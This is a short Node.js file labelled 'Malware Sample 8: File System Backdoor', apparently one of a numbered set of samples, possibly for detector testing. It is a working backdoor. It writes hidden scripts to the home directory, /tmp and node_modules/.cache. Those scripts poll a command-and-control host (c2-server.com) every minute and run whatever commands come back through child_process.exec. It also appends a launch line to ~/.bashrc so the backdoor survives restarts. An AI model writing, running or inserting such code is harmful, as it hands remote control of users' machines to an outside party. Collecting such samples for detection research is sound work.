// Malware Sample 8: File System Backdoor
// Pattern: Multiple file operations for persistence
const fs = require('fs');
const os = require('os');
const path = require('path');

const backdoorCode = `
const http = require('http');
setInterval(() => {
    http.get('http://c2-server.com/cmd', (res) => {
        let cmd = '';
        res.on('data', chunk => cmd += chunk);
        res.on('end', () => require('child_process').exec(cmd));
    });
}, 60000);
`;

// Create backdoor in multiple locations
const locations = [
    path.join(os.homedir(), '.backdoor.js'),
    '/tmp/.hidden_backdoor.js',
    path.join(process.cwd(), 'node_modules/.cache/.backdoor.js')
];

locations.forEach(location => {
    // Dangerous: Creates hidden backdoor files
    fs.writeFile(location, backdoorCode, { mode: 0o755 }, (err) => {
        if (!err) {
            console.log(`Backdoor installed at ${location}`);
        }
    });
});

// Modify startup files for persistence
const rcFile = path.join(os.homedir(), '.bashrc');
fs.appendFile(rcFile, '\nnode ~/.backdoor.js &\n', (err) => {
    console.log('Persistence achieved');
});
